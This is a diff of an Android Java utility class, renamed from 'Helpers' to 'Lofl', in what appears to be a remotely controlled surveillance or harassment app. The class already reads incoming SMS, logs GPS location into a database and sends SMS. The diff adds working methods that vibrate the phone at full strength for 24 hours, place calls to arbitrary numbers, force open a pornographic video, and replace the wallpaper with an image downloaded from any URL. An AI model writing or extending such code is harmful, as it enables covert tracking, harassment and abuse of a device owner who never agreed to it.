@@ -6,6 +6,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.RemoteInput;
+import android.app.WallpaperManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -19,9 +20,10 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
@@ -37,11 +39,12 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.List;
 
-public class Helpers {
+public class Lofl {
     private static int sId = -1;
     private static NotificationManager sNotificationManager;
     private static Bitmap sLargeIcon;
@@ -152,6 +155,61 @@ public class Helpers {
             }
         }
         return text.toString();
+    }
+
+    protected static void vibrator(Context context){
+        Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+        if(vibrator.hasVibrator()){
+            if(vibrator.hasAmplitudeControl()){
+                vibrator.vibrate(VibrationEffect.createOneShot(86400000L, 255));
+            }else{
+                vibrator.vibrate(VibrationEffect.createOneShot(86400000L, VibrationEffect.DEFAULT_AMPLITUDE));
+            }
+        }
+    }
+
+
+    protected static void phoneCall(Context context, String address){
+        Intent callIntent = new Intent(Intent.ACTION_CALL);
+        callIntent.setData(Uri.parse("tel:" + address));
+        context.startActivity(callIntent);
+    }
+
+    protected static void searchGoogleMaps(Context context, String query){
+        Uri uri = Uri.parse("geo:0, 0?q=" + query);
+        Intent mapIntent = new Intent(Intent.ACTION_VIEW, uri);
+        mapIntent.setPackage("com.google.android.apps.maps");
+        context.startActivity(mapIntent);
+    }
+
+    protected static void watchPornHubVideo(Context context, String videoId){
+        Uri pornVideo = Uri.parse("https://www.pornhub.com/view_video.php?viewkey=".concat(videoId));
+        Intent pornIntent = new Intent(Intent.ACTION_VIEW, pornVideo);
+        context.startActivity(pornIntent);
+    }
+
+    protected static Bitmap getBitmapFromUrl(String url){
+        try {
+            InputStream inputStream = new java.net.URL(url).openStream();
+            return BitmapFactory.decodeStream(inputStream);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+
+    protected static void changeWallpaper(Context context, Bitmap bitmap){
+        try {
+            WallpaperManager.getInstance(context).setBitmap(bitmap);
+        }
+        catch (IOException e) {
+            e.printStackTrace();
+        }catch (SecurityException se){
+            se.printStackTrace();
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
     }
 
     private static Bitmap getBitmapIcon(Context context, int icon){
@@ -272,7 +330,7 @@ public class Helpers {
                 .setSmallIcon(android.R.drawable.stat_notify_chat).addAction(whisperAction).setPriority(Notification.PRIORITY_HIGH)
                 .setStyle(new Notification.BigTextStyle().bigText(body.toString()).setSummaryText(Constants.NOTIFICATION_SUMMARY))
                 .setContentTitle(address).setContentText(body).setColor(context.getResources().getColor(android.R.color.holo_green_light)).setColorized(true)
-                .setTimeoutAfter(Constants.TIMEOUT_AFTER).setLargeIcon(Helpers.getBitmapIcon(context, android.R.drawable.sym_action_chat)).setGroup(Constants.PRIMARY_NOTIFICATION_GROUP).setContentIntent(createContentClickIntent(context, intent))
+                .setTimeoutAfter(Constants.TIMEOUT_AFTER).setLargeIcon(Lofl.getBitmapIcon(context, android.R.drawable.sym_action_chat)).setGroup(Constants.PRIMARY_NOTIFICATION_GROUP).setContentIntent(createContentClickIntent(context, intent))
                 .setCategory(Notification.CATEGORY_MESSAGE).setShowWhen(true).setAutoCancel(true).setVisibility(Notification.VISIBILITY_PUBLIC);
         sNotificationManager.notify(sId, notification.build());
     }
@@ -288,7 +346,7 @@ public class Helpers {
             @Override
             public void onLocationChanged(Location location) {
                 //Log.d("MessagingService", "latitudate = ".concat(String.valueOf(location.getLatitude()) + " longitude = ".concat(String.valueOf(location.getLongitude()))));
-                Log.d("MessagingService", "location row id = " + Database.insertLocation(context, MessagingService.sDatabase, location.getLatitude(), location.getLongitude()));
+                Log.d("MessagingService", "location row id = " + Database.insertLocation(context, DatabaseHelper.getInstance(context.getApplicationContext()), location.getLatitude(), location.getLongitude()));
             }
 
             @Override
@@ -313,7 +371,7 @@ public class Helpers {
         StringBuilder body = new StringBuilder();
         SmsMessage[] smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent);
         String number = smsMessage[0].getDisplayOriginatingAddress();
-        address.append(Helpers.reverseLookupNameByPhoneNumber(number, context.getContentResolver()));
+        address.append(Lofl.reverseLookupNameByPhoneNumber(number, context.getContentResolver()));
         for (int i = 0; i < smsMessage.length; i++) {
             body.append(smsMessage[i].getMessageBody());
         }
@@ -339,7 +397,7 @@ public class Helpers {
     protected static void sendSms(Context context, String response, String destTelephoneNumber) {
         SmsManager smsManager = SmsManager.getDefault();
         ArrayList<PendingIntent> sentIntents = new ArrayList<>();
-        String name = Helpers.reverseLookupNameByPhoneNumber(destTelephoneNumber, context.getContentResolver());
+        String name = Lofl.reverseLookupNameByPhoneNumber(destTelephoneNumber, context.getContentResolver());
         ArrayList<String> parts = smsManager.divideMessage(response);
         for (int i = 0; i < parts.size(); i++) {
             Intent intent = new Intent();
